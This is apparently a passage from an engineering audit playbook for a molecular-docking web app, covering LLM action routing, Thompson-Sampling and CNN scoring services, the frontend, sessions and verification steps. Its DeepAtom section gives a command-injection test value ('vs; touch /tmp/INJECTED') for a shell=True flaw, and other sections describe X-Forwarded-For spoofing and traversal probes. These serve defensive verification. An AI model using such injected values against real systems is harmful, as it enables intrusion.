2. **Guided-mode response scraping** — bypasses the LLM router entirely and matches phrases in the
   *model's own reply* plus the user's message, with a post-conversion branch that picks the next action
   from which of the two path fields is still empty. Crude, and the most reliable link in the chain.
3. **Chain-of-thought routing** (non-guided only) — load the KB, build a `<|im_start|>think` prompt, call
   the LLM, extract JSON with `findall(r'\{[^{}]+\}')` taking **the last match**, whitelist the action
   against a 12-value set, require `confidence in ("high","medium")`.
4. **Heuristic backstop** — "now what" / "what next" / "proceed" / "ready" plus any path set.
5. **Auto-learn** (§12).

The result is emitted as `event: ui_action` before `event: done`.

**The dispatch contract.** The browser **ignores `payload.btnId` entirely** and re-derives the element from
its own map; `confidence`, `reason` and `response` are also discarded on this path. The map is:

```
handleVinaUiAction   open_visualizer · load_ligand · load_receptor · vina_dock_guided · run_visualization
                     · open_vina · guide_pdb_conversion · select_protein · open_voxel_inspector
                     · toggle_grid_box · run_docking · switch_ligand_view · switch_protein_view
handleAttnUiAction   open_visualizer · open_vina · compare_mode · show_3d · run_finetune · load_model
special-cased        pdbqt_ready (intercepted upstream)
fallback             if (!entry) return;          ← silent no-op
```

**Gotchas.** G1 (the missing emotion-detector import kills the *entire* docking chat stream — one
`event: error` frame and never a token; it also explains why one CoT log file is 0 bytes, since its only
writer is unreachable), G58 (the drift table), G65 (the KB cache is read once forever while another module
writes to those files at runtime), G66.

**Verify.** Send messages that hit the KB triggers for the orphaned actions; the server logs the action and
the SSE frame arrives, and **no element pulses**. Confirm `ui_action.reason` starts with
`RAG: '<trigger>' cosine=…`, that ≥ 0.42 routes and < 0.42 falls through. Then verify the clear endpoint
actually empties history by sending a follow-up that depends on prior context — G4 means it will not.

---

## 15. The Thompson-Sampling driver

**Goal.** Launch the engine's TS generator and stream its live progress into a warm-up/belief visualiser.

**Launch.** Copy the source YAML into a temp dir and **regex-patch it in place**: the reaction SMARTS, the
iteration count, and — crucially — force `log_level: DEBUG`, because the very lines the visualiser consumes
are suppressed at INFO. Then run the engine's entry point with `cwd=<engine dir>`, `PYTHONUNBUFFERED=1`
and a prepended `PYTHONPATH`.

**Cancellation** — `os.kill(pid, SIGTERM)` — is the **only cancellation mechanism in the entire app**, and
it targets the direct child only, with no process group, so grandchildren survive.

**The browser side runs the parser in a Web Worker**, and the reason is stated in the file header: the
stream is high-frequency log lines, each needing ~10 regex matches plus an incremental variance update over
a reagent map that can exceed 8000 entries. On the main thread that starves `requestAnimationFrame` and
stalls the 3-D plots. Only raw strings cross the boundary (no transferables): `{type:'line', data}` in;
`reagent_update` / `wu_event` / `ts_event` / `phase` / `log` / `status` / `done` out.

The worker strips the Python log prefix with one regex, then runs a cascade of ~12 patterns, and maintains
**Welford online statistics** per reagent (`delta = x − μ; μ += delta/n; M2 += delta*(x − μ)`).
Back-pressure is explicit and worth copying: recompute the top-5 only every 200 updates; reject new
reagents once 8000 are known and the score is below 75 % of the current fifth-best; suppress log lines for
reagents outside the top 5. On the main thread: render bars every 50 updates via rAF, batch log lines into
a `DocumentFragment` capped at 150, cap the DOM at 200 children, and throttle the status bar to 1 Hz.

**Gotchas.** G50 (the worker cannot be terminated and the modal wedges), G63 (a leaked temp dir per run),
plus: the config read-back endpoint reads the **unpatched** YAML, so it reports `INFO` while the running
job was forced to `DEBUG`; the DEBUG injection appends with a hardcoded 4-space indent, assuming the target
block is last in the file; and two unclosed file handles in the patcher.

**Verify.** Start a 2-iteration run and diff the temp YAML against the source to confirm the injection
landed in the right block. Watch the status stream for progress bars arriving as **separate frames**, which
proves the `\r` split. Then kill the job and check with `ps` for orphaned grandchildren — they will be
there.

---

## 16. The DeepAtom service

**Goal.** Score a ligand library against a target with an external 3-D CNN, then show per-atom saliency.

**Datasets** come from the second YAML section, **re-read and re-parsed on every request** (no cache), and
their paths are never absolutised (G22) so they resolve against the process CWD. Estimation builds a bash
string and runs it synchronously with a 300 s timeout (→ 504).

**Output parsing** is defensive and worth copying in shape: skip everything before the first `^={10,}`
banner, then try a strict `id  value [value]` regex while excluding progress lines, dedupe by id; if
nothing matched, fall back to header-row detection against a hint list plus positional column extraction.
Status is `"success"` if any compound parsed, `"partial"` otherwise — a genuinely useful third state.

**Saliency** is vanilla input-gradient: build the voxel tensor with `requires_grad=True`, take the scalar
score, `backward()`, and reduce the channel axis. Atoms are mapped back by
`round((coord − origin)/voxel_size)` and clamped.

**Gotchas.** G16 (the `shell=True` injection — this is the one), G47 (sign discarded, input omitted), G48
(silent clamping and a derived origin), plus: the second forward pass in the same request reads the archive
by a different key-priority rule than the saliency pass did, so the reported score can come from the wrong
array — and it is a wasteful second forward anyway, since the first one already ran.

**Verify.** POST `{"test_type":"vs; touch /tmp/INJECTED"}` with a valid directory. **If `/tmp/INJECTED`
appears, G16 is confirmed.** Then validate the gradient itself against a finite-difference check on a
handful of voxels before the channel reduction; log how many atoms hit the clamp (nonzero means the origin
is wrong); and confirm the timeout path returns 504.

---

## 17. Frontend architecture

**Single page with Jinja-included modal partials and globally-scoped classic scripts. No bundler, no
modules, no framework.** Three URLs render the same template.

**Load order is load-bearing** (G49): Tailwind CDN (unpinned) → jQuery (pinned) → **Plotly (pinned) — the
only chart and 3-D library in the whole app** → two inline `<script>` blocks (~1300 lines) → the docking
script, which **re-declares three renderers and wins** → dynamically loaded scripts with a 3-level src
fallback → the remaining tool scripts.

**There is no modal registry** — modals are hardcoded includes plus per-tool `_xShow()`/`_xHide()` pairs,
and **two different show mechanisms coexist** (`classList` hidden/flex vs `style.display`). Pick one.

**No `localStorage`, no `sessionStorage`, no CSS custom properties.** All state is module-level JS globals;
nothing survives a reload; theming is literal hex in utility classes and inline styles. The z-index ladder
is hardcoded per site across nine levels — give it a constants block.

**Everything 3-D is Plotly `scatter3d`.** Ligand view = a `Bonds` lines trace with `null` separators plus an
`Atoms` markers trace; protein view = a dim background trace plus a coloured hit trace, with an
optimisation that restyles only trace 1 when the background length is unchanged. Camera is persisted in a
module global via a `plotly_relayout` listener attached **once per element**. The grid box is three traces
(a translucent `mesh3d`, a dashed edge `scatter3d` over the 12-edge list, and a centre cross).

**The progress terminal** is created on `document.body` — resizable, monospace, green-on-near-black — and
decodes the private SSE sentinels into bars and boxed blocks. Percentage is derived as
`min(100, round(stars/51*100))`, where **51 is the hardcoded bar width**.

**Gotchas.** G49 (the renderer collision — the subtlest one), G50, G51, G52, G53, G54, G55, G56, G57, G59,
G60, plus: an ordering assumption where a defaults fetch resolves inside a `.then` while the dependent POST
is issued synchronously right after, and a `setTimeout` ladder (300 → 400 → 500 ms) whose own comment
admits it is overwriting what an earlier callback wrote.

**Verify.** Open the ChemBERT view, render benzene, then render any other 6-heavy-atom SMILES without
closing — the geometry will not move (G49). Start a TS run, close the modal, and confirm the worker is
still parsing; reopen and press Run (nothing happens). Start a dock, close the modal, and watch both
`EventSource` connections stay open in the Network tab; then ✕ the panel, dock again, and count
`getEventListeners(document).mousemove` growing by one per cycle (G52). Render a one-atom SMILES and check
it is not uniformly the "lowest" colour (G56).

---

## 18. The active-learning pipeline

**Goal.** Close the loop: the generator proposes molecules → they are really docked → the real affinities
become fine-tuning labels → the distribution shift is plotted.

```
(0) TS engine            →  results_TS/<run>.csv                  cols: Name, SMILES
(1) SMILES → 3-D PDB     →  MolFromSmiles → AddHs → EmbedMolecule(ETKDG) → MMFFOptimize → MolToPDBFile
(2) PDB → PDBQT          →  obabel -ipdb -omol2 ; obabel -imol2 -opdbqt -xh   (ProcessPoolExecutor)
(3) shard                →  split_part_1 … split_part_N           (COPY, not move)
(4) dock                 →  <run>_p<N>_results/<name>_out.pdbqt   ← THE COMMAND IS NOT IN THE REPO
(5) harvest              →  awk '/REMARK VINA RESULT/ {print $4; exit}'  →  Ligand_ID,Affinity
(6) merge on Ligand_ID ↔ Name   →  SMILES,Affinity                ← the intended LABELS file
(7) fine-tune the surrogate on it
(8) overlay iteration N vs N+1 affinity histograms
```

**Gotchas.** G27 (no `set -e`, two different required working directories), G28 (the no-op rename), G29
(the hardcoded iteration index, already inconsistent across five files), plus: **`-xh` keeps every
hydrogen** all the way into the PDBQT, and combined with `AddHs` before embedding that pushes atom counts
toward the engine's hard per-ligand atom limit — at which point it aborts with `Ligand too large!`. Stock
practice is merged non-polar hydrogens. And molecules can vanish at **four** points (a bare
`except: return "error"` with no filename, a print-and-continue, a score-less file dropped by the harvest,
and an inner join) with the only surviving evidence a row-count delta.

**Verify.** Row-count conservation across every hop: input CSV → `.pdb` count → `.pdbqt` count →
`_out.pdbqt` count → harvested CSV → merged CSV. Shard sanity: the shard count matches, and the total file
count is unchanged. Plot check: the "optimised" distribution must sit **left** of the initial one, and both
legend means must be negative.

---

## 19. ⧉ Sessions — server-side chat persistence

**Goal.** Replace the process-global chat lists (§4) with durable, per-client history, and expose a model
registry the UI can render.

**Schema** — two tables, and it is the clean part of the subsystem:

```sql
sessions(id PK, ip, chat_type, created_at, updated_at,
         model DEFAULT '<default>', turn_count DEFAULT 0)
CREATE UNIQUE INDEX ON sessions (ip, chat_type);

turns(id PK, session_id → sessions(id), role, content, created_at)
CREATE INDEX ON turns (session_id);
```

Timestamps are UTC ISO-8601 to second precision. A "session" is **one row per `(ip, chat_type)`** — there
is no session id, cookie or token (G69). Creation and resumption are both implicit: select, insert on
miss; read `ORDER BY id DESC LIMIT n` then reverse.

**Endpoints.** `GET /session/history?chat=` (last 40, chronological) · `POST /session/append` (empty
content is silently dropped and still returns ok) · `POST /session/clear` · `GET /session/sessions` (per
session: label, icon, timestamps, model, turn count, and a 3-turn preview truncated to 120 chars — and
its *error* payload returns HTTP 200) · `GET /session/models` · `POST /session/set_model` (the only
endpoint here that returns 400).

**The model registry is advisory** (G88) and its active key is a **process global mutated by an
unauthenticated POST** — one client flips the displayed model for everyone. The code comments admit it.

**Consumption.** The chat generator reads the last 20 turns and writes two rows (user, assistant) per
exchange; the in-memory list survives as a fallback, which is G72.

**Gotchas.** G69, G70, G72, plus: `turn_count` is incremented per row and zeroed on clear while
`load_history` reads rows, so the counter is display-only and will drift; and the `turns` table is
**never pruned** — the read is limited, the table is not.

**Verify.** Two different `X-Forwarded-For` values must return disjoint histories (and the fact that you
*can* set them is the finding). From a fresh IP, send one message after another IP has sent two, and
assert the prompt contains none of the first IP's turns (G72). Clear, then stream, and inspect the
assembled prompt — pre-clear turns reappearing is G71. Then hammer append with ~50 concurrent requests
and compare `COUNT(*)` against the number sent while grepping the log for `database is locked` (G70).

---

## 20. ✎ Unified mini-chat and consolidated chain-of-thought

**Goal.** Collapse three near-duplicate per-tool chat endpoints into one implementation, and four
copy-pasted CoT routers into one module.

**What unified.** One SSE generator serves all tools; the tool rides inside the request `context`, not
the URL. Three per-tool switch points — prompt selection, context-block builder, and the UI-action router
— and both the DB persistence and the CoT routing are imported rather than reimplemented. All the prompt
text and the per-tool markdown introductions live in one file.

**What did not.** The URL space still has two prefixes, and the third tool has no endpoint of its own —
it rides one of the other two, distinguished only by a context field. And the **non-streaming** variants
each re-implement prompt assembly, history load, memory trim and persistence inline instead of calling
the shared generator, so ~35 duplicated lines already differ between them.

**Prompt assembly** (identical on all three paths): system prompt (guided or general) → last **6**
history turns → context block + user message → assistant turn.

**Routing cascade:** guided mode matches phrases in the *assistant's own reply* and short-circuits;
otherwise keyword/RAG → CoT → a "now what / next step" heuristic → the auto-learner as a last resort.

**Chain-of-thought, precisely.** It is **not streamed and not replayed**. It is a second, *blocking* LLM
call made after the user-facing reply has finished streaming, whose only product is a small JSON action
decision. The prompt ends in a literal `think` role token to elicit reasoning before the JSON; the reply
is parsed by stripping fences, then `findall(r'\{[^{}]+\}')` taking the **last** match — a non-recursive
regex, so **any nested object makes extraction fail**. Then a whitelist plus a confidence gate.

Storage is two dedicated append-only file loggers with `propagate=False`, no rotation and no size cap.
Nothing ever reads them back, so there is no replay path — and on the shipped host one of them is **0
bytes**, which is direct evidence that path never fired.

**Gotchas.** G71, G72, G73, G76, G78, plus: the KB is cached on first read and a failed read caches the
empty string **permanently**, silently disabling CoT for the process lifetime; and the empty-message SSE
frame is bare text while every other error frame is JSON, so a client doing `JSON.parse` on `error`
throws on exactly that case.

**Verify.** Send messages that hit the triggers for the divergent action names (G76) and confirm which
string arrives. Confirm the CoT log file grows (or, if it stays at zero, that its only writer is
reachable at all). Feed the parser a reply containing a nested object and confirm it falls through to
`None`.

---

## 21. ⬢ Pose generation

**Goal.** Build a 3-D ligand pose from a SMILES string, let the user manipulate its torsions in the
browser, and score it against a receptor with any of three backends.

**The split is the design.** Server-side: RDKit parse → reject above **150 heavy atoms** → formula →
rotatable-bond perception against a strict SMARTS (excluding triple bonds, terminal atoms, trihalomethyl,
*t*-Bu and amide-like bonds) → `AddHs` → ETKDGv3 embed with a **fixed seed**, retrying with random
coords → MMFF optimise with a UFF fallback → heavy-atom coordinates only, 4 dp. Then a **torsion tree**:
delete the rotatable bonds, take connected components as rigid fragments, make the **largest fragment the
root**, BFS the fragment graph, and emit per non-root fragment `{from, to, moves[]}`. **All kinematics
then happen in the browser** — rotating a torsion is one rotation applied to `moves`.

**Formats crossing the boundary:** SMILES in; JSON atom/coord/bond/torsion arrays out; **posed PDB text
as a JSON string** browser→server for all three scorers and both save paths; PDBQT converted to PDB
server-side; SVG for molecule cards; a zip for batch download. The client never sees PDBQT and the server
never sends binary except the zip.

**Three scoring backends** behind one dropdown: the voxel CNN, the graph network (§16 of the engine
playbook), and a **pure-Python reimplementation of the five-term docking score** — which is now the
*third* copy of that function in the system (server docking route, pose route, and the browser), with the
pose copy carrying a rotation weight the docking copy lacks. Pair cutoff 8.0 Å with a 2.5 Å bounding-box
pre-filter; `ΔG = Σe / (1 + w_rot·N_rot)`.

**Every failure returns HTTP 200 with `{ok:false, err}`** — deliberate, because the frontend degrades to
its own in-browser parser and layout. That is a defensible choice; document it, because it defeats naive
monitoring.

**The client** is two IIFEs: a **pure, DOM-free, Node-testable engine** (vector/quaternion math, a
hand-written SMILES parser, bridge-finding for rotatable bonds, a force-directed 2-D layout, a PDB
parser) and a UI controller. Rendering is dual: a hand-built SVG with painter's-algorithm depth sorting
for the 2-D view, and Plotly `scatter3d` for the 3-D view — plus interaction overlays (H-bond, salt
bridge, π–π with explicit distance cutoffs), an SES surface and DSSP-style secondary structure.

**Gotchas.** G82 (the standalone template cannot parse), plus: a client constant that mirrors a server
threshold by comment with no runtime agreement check; an elaborate camera-preservation protocol that
exists solely because the plotting library echoes a stale camera on update; and modal state (ligand,
protein, box, config, caches) surviving close.

**Verify.** Round-trip a known SMILES and assert the formula, that atom/coordinate/torsion array lengths
agree, that every index in the root and in each torsion's `moves` is in range, and that three repeat
calls are **byte-identical** (the embed seed is fixed). Cross-check the pure-Python score against the
real docking binary on the same pose — they should agree to ~0.1 kcal/mol, and divergence localises which
of the three duplicate implementations drifted. `node --check` the standalone template (G82).

---

## 22. ⟐ The Thompson-Sampling frontend, split seven ways

**Goal.** One 500-line file plus a worker became seven modules plus a worker, loaded lazily and
**serially** — core → chart → ui → warmup → worker-bridge → run. Order is load-bearing.

| Module | Owns |
|---|---|
| core | the single shared mutable state object, the speed table, the tab switcher |
| chart | a hand-rolled 2-D `<canvas>` sparkline — the one place that is **not** Plotly — with stride decimation, hover tooltip and history replay |
| ui | everything DOM: sidebar, CPU/GPU monitors, speed meter, log-level cycler, bar/winner renderers, hover cards, caches, the top-5 poller, multi-job pools |
| warmup | the two frame-stepper animators and the reaction picker |
| worker-bridge | worker↔main routing, multi-job fan-out, worker lifecycle and seeding |
| run | modal show/hide, config, reset, run/cancel/finalise, reconnect, `window.*` exports |
| worker | line parsing, statistics, off-thread ranking |

**There is no module boundary — only file boundaries.** All seven share one mutable global state object;
cross-module calls are bare global identifiers with `typeof f === 'function'` guards at the load-order-
fragile edges. The `window.*` re-exports exist **only** because dynamically-injected HTML uses inline
`onclick` handlers.

**What the worker bridge adds over posting straight to the worker** — this is the part worth copying:

1. **Multi-job fan-out**: one worker *and* one stream per job, collected in an array, with every message
   stamped with its job index so only the visible job repaints.
2. **Worker URL resolution** with a three-tier fallback plus a cache-bust.
3. **Pre-seeding before any line arrives**: batch size, log level, an iteration offset with the last N
   history scores to prime the rolling window, and the reagent set reconstructed from the persisted
   session.
4. **Corrupt-session detection**: if `points > scores × 1.4`, trust the scores length and warn.
5. **Log triage the old version had none of** — mirroring, colour-coding by severity, and a **stateful
   traceback capture** that forwards subsequent stderr body lines once an error marker is seen.
6. **Render throttling**: repaint every 50th update; drain events on `requestAnimationFrame` with an
   **8 ms frame budget** and re-queue; batch log lines into a fragment and cap the DOM.
7. **Event-buffer trimming** with rebasing, to bound long runs.
8. **Deliberate message deprecation**: the worker's own live ranking message is received and **dropped**,
   because rankings now come from a periodic server poll — so the two cannot fight.

**And the change that matters most is inside the worker** (G89): a single authoritative
`[TS:stats] iter= mean= std= score=` line from the backend replaces the worker's own score derivation.
The worker syncs its iteration counter, stores the score, and returns. Its own accumulator still exists
and is **deliberately no longer called** on that path. The stated reason is that the worker's regex could
miss and fall back to posterior means, so a live chart and a reloaded chart disagreed. Now they cannot.

The worker also gained: off-thread top-5 ranking throttled to ~10 Hz, ranked by **best molecule score**
(monotonic) rather than mean (which "made the list flip constantly"), with **hysteresis** — an incumbent
is displaced only if a challenger beats it by a margin; per-slot derived ranges, because the backend emits
no range summary; and log/debug level gating where the old version posted unconditionally.

**Gotchas.** G83, plus: two competing writers of the same bar state race on modal open (an immediate poll
and an awaited reconnect, whichever HTTP response lands last wins), and the reconnect sets its running
flag *before* it starts streaming, so a second open during the in-flight request skips reconnect and
leaves the modal half-initialised.

**Verify.** Start a run with ≥2 reactions, count workers and streams, close the modal, count again
(unchanged = G83), reopen (doubled). Then the parity test that proves G89: note the chart mid-run, hard
reload, and assert the replayed chart is **identical** — any divergence means the worker fell back to its
own scoring.

---

## 23. ⌁ Two tools removed, one button kept

**Goal.** Two sidebar tools are deliberately **not shipped**: the **Get Ligand Center** calculator and
the **second LLM gateway** (the Reasoning tool). The Reasoning *button* is kept and repointed at an
external app. This section is here for two reasons: so a rebuild does not reintroduce them by accident,
and because cutting a vertical slice out of a tree like this one has a repeatable shape worth stating.

### 23.1 What a clean removal covers

A sidebar tool in this app is **eight** things, not one. Delete the button and the other seven become
orphans that still load, still register routes, and still appear in the route table:

| Layer | Get Ligand Center | Reasoning gateway |
|---|---|---|
| Sidebar button | `#sidebarLigandCenterBtn`, `data-nav="ligcenter"` | `#sidebarReasoningBtn` — **kept**, rewritten (§23.3) |
| Nav dispatch case | `hub.js` `case 'ligcenter'` | `hub.js` `case 'reasoning'` |
| Modal markup | `ligand_center_modal.html` **and** an inlined duplicate `#ligandCenterModal` in `hub.html` | `reasoning_modal.html`, pulled in by an `include` directive |
| Frontend controller | `ligand_center.js` + its `<script src>` tag | the `<script>` inside the modal template |
| Route module | `POST /tools/ligand_center` in `uiapp/core/pdb_converter.py` | `reasoning_routes.py` (the tree's **only** blueprint) |
| Client library | — | `uiapp/llm/claude_client.py`, `uiapp/llm/gateway_probe.py` |
| Config keys | — | `REASONING_STATE_DIR`, and the `CLAUDE_*` env triple |
| On-disk state | — | `data/reasoning/` |

**The modal existed twice.** `ligand_center_modal.html` was a standalone template *and* the same markup
was pasted inline into `hub.html`; only the inline copy was ever rendered, because nothing included the
standalone one. Removing the file alone would have left a fully working tool. **Before deleting a
template, check whether its markup is also inlined somewhere** — `grep` for the modal's root element id,
not for the filename.

**Deleting the blueprint deleted the only reason to have a registration step.** Every other route module
decorates the global `app`, so with `reasoning_routes` gone `routes/__init__.py` is a flat list of
`_load(...)` calls again, and the try/except that registered `reasoning_bp` (documented at G85 in an
earlier drop as *never* registered) is gone with it. That is a net simplification: one loading mechanism
instead of two.

### 23.2 ⚠️ The near-miss identifier

`pose.js` and `pose_generation.html` contain 23 uses of **`ligCenter`** — 13 lines in `pose.js`, 9 in the template:

```js
PG.init.ligCenter(st)        // pose-frame ligand centroid
PG._ligCenter(off)           // centroid after applying a torsion offset
```

This is the geometric centre of the ligand's own atoms, used to place, translate and rotate a conformer
inside the docking box. It is **core pose-generation math** and has nothing to do with the Get Ligand
Center tool. `grep -i 'ligand.\?center'` matches both; `grep ligand_center` matches only the tool.

> **Match `ligand_center` (with the underscore), and read every hit before cutting.** This is G85, and it
> is the same failure mode as G82: two unrelated things named almost the same, in the same repository.

### 23.3 The kept button

The Reasoning entry stays in the sidebar and becomes a plain external link:

```html
<button id="sidebarReasoningBtn"
        onclick="window.open('{{ reasoning_url }}', '_blank', 'noopener,noreferrer')">
```

Four things about that, each deliberate:

1. **No `data-nav`.** `hub.js` wires one delegated click listener over `[data-nav]` and dispatches to
   in-page openers. There is no longer anything in-page to open, so the button carries its own `onclick`
   and never reaches the dispatcher. Leaving `data-nav="reasoning"` on it would have meant a silent
   no-op on every click once the case was deleted — the delegated-dispatch pattern fails *quietly*.
2. **The URL comes from config**, not the template: `config.REASONING_URL`, env `UI_REASONING_URL`,
   default `http://localhost:5001/`. `hub_routes.hub()` passes it as `reasoning_url` — the page's only
   template variable. Repointing it is an env change.
3. **`noopener,noreferrer`.** `window.open` without `noopener` hands the opened page a live
   `window.opener` reference back into the app.
4. **Nothing validates the URL.** No listener on that port means the new tab fails to connect; the app
   neither knows nor cares. That is the correct amount of coupling for a link to a separate service, but
   it does mean a typo in the env var is invisible until someone clicks.

**Jinja renders an undefined variable as the empty string**, so forgetting to pass `reasoning_url` would
ship a button that opens `about:blank` — with no error anywhere.
`test_import_smoke.py::test_reasoning_button_is_an_external_link` renders `/` through the test client and
asserts the configured URL is actually present in the HTML. That is why the test renders the page instead
of just checking the template source.

### 23.4 What you lose, and what replaces it

Nothing, for Get Ligand Center. `POST /tools/pdb_to_pdbqt` already returns `center_x/y/z`,
`extent_x/y/z` and `suggested_size` for the file it just converted (`_pdbqt_center` in
`tools_routes.py`).

The two implementations **disagreed**, which is the more useful point:

| | Removed tool | `_pdbqt_center` (kept) |
|---|---|---|
| Atoms | all non-water `HETATM`, hydrogens skipped by name | `ATOM` + `HETATM` of the first model, hydrogens skipped by **AutoDock type** (`H`/`HD`/`HS`) |
| Centre | centroid | centroid |
| Size | bounding-box extent per axis | `max(20, ceil(max extent) + 8)`, one cube |

The kept one is the definition the rest of the app uses — recomputing it for the reference ligand
reproduces `input_routes.yml`'s 1P9M centre to the digit, and the alternatives do not (§ the docking
box). Two tools returning different "ligand centres" from the same file is worse than one tool.

### 23.5 Verify

```bash
python -m pytest tests/                     # 57 tests
python tests/test_import_smoke.py           # 81 routes; excluded-feature + dangling-ref assertions
grep -rn ligand_center uiapp web            # expect: nothing
grep -rn ligCenter web/static/js/pose.js    # expect: 13 lines, all untouched
```

`test_excluded_features_absent` asserts no route contains `ligand_center` or `reasoning` and that ten
named files stay off disk. `test_hub_template_has_no_dangling_references` asserts `hub.html` and `hub.js`
reference no removed script, template, modal id or handler — the failure mode a route-table check cannot
see, because a dangling `<script src>` is a 404 in the browser, not in Flask.

---

## Verification methodology (applies throughout)

- **Run a static undefined-name pass in CI.** `pyflakes` finds all six of G1's `NameError`s in under a
  second, and no amount of structural testing will. The shipped dependency-free layout test and a
  static-analysis pass are complements, not alternatives.
- **Dump the route table and count it.** `[print(r.methods, r.rule) for r in app.url_map.iter_rules()]` —
  a missing endpoint tells you a side-effect import did not run.
- **Prefer an invariant to a threshold.** `len(records) == index.ntotal`, `‖vector‖ ≈ 1`,
  `n_atoms == grep -cE '^(ATOM|HETATM)'`, `atoms[argmin(e)].weight_norm == 1.0` — none of these can drift.
- **Test the contract between layers, not each layer alone.** The single highest-value test in this
  codebase does not exist: *every action string in the KB and both routing allow-lists must be a key of the
  frontend action map, and every `btnId` must resolve to a real element id.* It would have caught the whole
  of G58 and most of G53.
- **Prove a claim by differencing two inputs.** Two three-atom molecules with identical weight vectors
  prove G10. Two 6-heavy-atom molecules with identical geometry prove G49. Two concurrent docks with one
  progress stream prove G3.
- **Attach the streams before starting the work.** Both docking SSE endpoints must be open *before* the
  POST, or you will conclude they are broken when they are merely late.
- **Check the negative space.** A 0-byte log file is evidence: it means its only writer is unreachable.
  A golden fixture with one fewer row than its input is evidence. A `Done.` in a job log with no output
  file is evidence.
- **Soak for leaks, because nothing here frees anything.** 20 parallel docks plus 100 sequential TS runs:
  watch RSS (job dicts and queues), temp-directory count (one per run), and thread count (one per stranded
  SSE generator).
- **Run from a different working directory**, and with the reloader off. Half the path bugs and all of the
  double-state bugs disappear or appear depending on those two choices.

**Suite layout that would work:**

```
static_check    pyflakes over every route module + the KB/action-map cross-reference   (G1, G58, G77)
                + node --check every shipped inline <script> block                     (G82)
route_check     url_map inventory · error-shape uniformity · SSE header presence
                + assert the blueprint-registered routes actually exist                (G85)
config_check    the shipped structural test WITH its exclusions removed · env-override round-trip
                + no /home/<user> paths in EITHER tree                                 (G67)
dead_check      grep render_template / {% include %} / <script src> / new Worker;
                every file not matched is a fossil until proven otherwise              (G91)
dock_check      atom-count parity vs grep · best_affinity inside the mode table · two-dock interleave
model_check     two same-length SMILES → different vectors · cache hit timing · concurrent cold load
router_check    records == ntotal · unit-norm · batch-query normalisation · threshold sweep
                + every tool_hint matches at least one record                          (G73)
learner_check   parser variants (tagged/bare/fenced/truncated) · restart determinism · injection round-trip
                + assert learned entries reach the INDEXED KB, not only the shadow      (G74)
session_check   X-Forwarded-For isolation · fresh-IP prompt contains no other IP's turns (G72)
                · clear-then-stream · concurrent append vs COUNT(*)                     (G70, G71)
convert_check   empty-output rejection · BRANCH count on the fallback · traversal + out_dir probes
pose_check      formula + array-length agreement · 3× byte-identical (fixed seed)
                · pure-Python score vs the real binary to ~0.1 kcal/mol
front_check     renderer identity guard · listener count across open/close cycles · worker termination
                + live-vs-replayed chart parity                                         (G89)
```

---

## Appendix — key constants

```
── UI bind ──────────────────────────────────────────────────────────────────────
host/port       $UI_HOST/$UI_PORT > visualizer.host/visualizer.port > 0.0.0.0:5000
                bad value falls THROUGH to the next level, never raises
                banner prints the resolved address and which level supplied it

── engine discovery ─────────────────────────────────────────────────────────────
ELION_CWD       probed, not guessed: ../elion · ../elion/src/elion ·
                ../../elion/src/elion · ../../elion · ./elion — FIRST holding input_TS.yml
                $ELION_CWD wins and is never probed · fallback ../elion/src/elion
derived from it TS_ENGINE_DIR · TS_BB_BASE · DEEPATOM_ROOT   ⇒ one override moves all three
missing yml     ts_config AND ts_run answer HTTP 404 ("yml not found: <path>")   (G92)
                ⇒ no reaction picker, blank #tsTsBars (G93), and a 404 that
                  looks exactly like an unregistered route — ONE cause, THREE symptoms
TS data chain   ELION_CWD → input_TS.yml → visualizer.output_dir → <it>/TS_Session
                → /ts_top5 → _ts._activeBars → #tsTsBars     (break it anywhere, panel empty)

── process ──────────────────────────────────────────────────────────────────────
bind            0.0.0.0:5000 · debug True · threaded True        (dev server only; no WSGI entry point)
LLM server      127.0.0.1:8001 · /v1/completions · /v1/chat/completions · /health
                --n_gpu_layers 35 --n_ctx 8192 · chat_format 'chatml' · CORS '*'
boot order      env vars → import app → app.config['VINA'] → log handler → app.run    (G20)
upload limit    NONE — MAX_CONTENT_LENGTH is never set; only a '.pdb' extension check  (G17)

── timeouts / intervals ─────────────────────────────────────────────────────────
0.15 s          progress-bar flush period                    0.5 s   flush-thread join
0.5 s / idle 60 dock-progress SSE poll / termination         4 s     SSE ': ping'
150 × 0.1 s     tail-log wait for a fresh log file           30      tail-log header-read attempts
0.04 s / idle 300   tail-log poll / cap                      30 s    finetune SSE q.get
15 s            TS SSE q.get                                 60 s    obabel subprocess
300 s           DeepAtom script (→ HTTP 504)                 120 s   LLM request · 3 s health check

── buffers / counts ─────────────────────────────────────────────────────────────
bufsize 0 + read(1)      docking stdout (bar chars have no newline)
bufsize 0 + read(65536)  TS stdout, split on [\r\n]+ keeping the partial tail
bufsize 1 + text=True    finetune stdout (line-oriented, safe)
top_pairs[:15] · top_indices[:50] · log_preview[:2000] · preview head(10)
chat history [-6:], trimmed at >20 by del [:2] · CoT history [-3:] · prompt tail [-600:]

── docking ──────────────────────────────────────────────────────────────────────
GPU CLI         --thread (≥1000, rec. 8000) · --search_depth · --opencl_binary_path · --rilc_bfgs
                --center_x/y/z --size_x/y/z --seed --num_modes --energy_range
                NO --exhaustiveness · NO --cpu                                          (G24)
engine limits   MAX_NUM_OF_ATOMS 130 · LIG_TORSION 48 · LIG_PAIRS 4096 · BFGS_STEPS 64
                RANDOM_MAP 20000 · GRIDS_SIZE 17 · PROTEIN_ATOMS 50000 · SMALL_BOX grid 128³
MC              Metropolis temperature 1.2 (hardcoded) · random map index (step + gll*depth) % 20000
BFGS            backtracking c0 1e-4, max_trials 10, multiplier 0.5, alpha0 1 · grad stop 1e-5
RILC-BFGS       Armijo 1e-4 · curvature 0.1 · max linesearch 10 · cautious factor 1e-6
scoring weights gauss1 -0.035579 · gauss2 -0.005156 · repulsion 0.840245
                hydrophobic -0.035069 · hbond -0.587439
term forms      gauss1 exp(-(s/0.5)²) · gauss2 exp(-((s-3.0)/2.0)²) · repulsion s² if s<0
                hydrophobic piecewise-linear on [0.5,1.5] · hbond piecewise-linear on [-0.7,0]
kernel cache    Kernel{1,2}_Opt.bin are PTX TEXT with .target sm_XX — delete on a GPU mismatch (G25)
score sign      NEGATIVE kcal/mol, lower is better; harvested by awk '$4' with exit ⇒ MODEL 1 only
box defaults    center (-25.7, 0.22, 28.39) · size 20³ · exhaustiveness 8 · num_modes 9 · Δe 3
                (hardcoded as .get() fallbacks because the per-protein list is unreachable — G2, G23)
output          <ligand_dir>/<stem>_out.pdbqt · ONE global log path for the whole server (G3)
PDBQT parse     match line[:6] in ('ATOM  ','HETATM') — NOT line[:4] in ('ATOM','HEAT')   (G9)
bond inference  O(n²), flat 1.85 Å cutoff, element-unaware

